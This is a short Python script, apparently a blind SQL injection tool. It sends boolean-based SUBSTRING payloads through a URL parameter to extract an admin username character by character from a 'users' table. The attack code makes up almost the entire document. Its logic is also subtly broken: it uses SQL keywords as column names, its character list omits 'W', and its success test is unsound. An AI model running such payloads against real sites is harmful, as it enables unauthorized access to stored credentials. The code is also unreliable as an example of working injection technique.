import requests
from bs4 import BeautifulSoup

def test_sql_injection(url):
    # Define a list of common database query keywords to use in the injection
    query_keywords = ['SELECT', 'FROM', 'WHERE', 'JOIN', 'LIMIT']

    # Define a list of characters to use in the boolean-based attack
    characters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'X', 'Y', 'Z']

    # Add a single quote to the end of the URL to test for SQL injection
    url_injection = url + "'"

    # Loop over the query keywords and characters to create a boolean-based payload
    for keyword in query_keywords:
        for i in range(1, 20):
            for char in characters:
                # Create a payload to check if the i-th character of the admin username is char
                payload = f"' OR SUBSTRING((SELECT {keyword} FROM users WHERE username='admin'), {i}, 1)='{char}'--"

                # Make an HTTP GET request with the injection and payload
                r = requests.get(url_injection, params={'id': payload})
                soup = BeautifulSoup(r.text, 'html.parser')

                # Check the response to determine if the injection was successful
                if 'error in your SQL syntax' not in soup.text:
                    print(f"SQL injection vulnerability detected with character '{char}' in position {i} of the admin username, query keyword: {keyword}")
                    break
            else:
                print(f"No SQL injection vulnerabilities detected with character '{char}' in position {i} of the admin username, query keyword: {keyword}")
                continue
            break
        else:
            print(f"No SQL injection vulnerabilities detected with query keyword: {keyword}")


